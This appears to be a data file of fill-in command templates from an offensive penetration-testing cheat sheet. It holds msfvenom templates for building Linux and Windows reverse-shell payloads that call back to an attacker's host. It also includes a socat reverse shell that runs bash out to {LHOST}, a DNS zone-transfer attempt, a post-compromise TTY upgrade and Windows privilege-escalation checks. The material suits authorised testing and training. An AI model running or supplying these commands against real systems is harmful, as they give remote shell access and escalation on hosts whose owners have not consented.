items.name: DNS — quick recon
items.description: Common record types in one shot.
items.template: dig +short ANY target.tld @8.8.8.8 ; dig AXFR target.tld @ns1.target.tld

items.name: msfvenom — Linux reverse shell ELF
items.template: msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o shell.elf

items.name: msfvenom — Windows reverse shell EXE
items.template: msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o sh.exe

items.name: rlwrap + nc (better history)
items.description: Arrow keys + tab completion in shell.

items.name: Bash TTY upgrade
items.description: After landing — get a real PTY.
items.template: python3 -c 'import pty;pty.spawn("/bin/bash")' ; export TERM=xterm ; stty raw -echo;fg

items.name: PowerShell one-liner reverse shell
items.description: Drop straight into a Win shell.

items.name: winPEAS
items.description: Run from local copy after transfer.

items.name: Unquoted service paths
items.template: wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v "\""

items.name: AlwaysInstallElevated
items.template: reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated ; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

items.name: Socat — full TTY
items.template: socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}  # listener\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}  # target
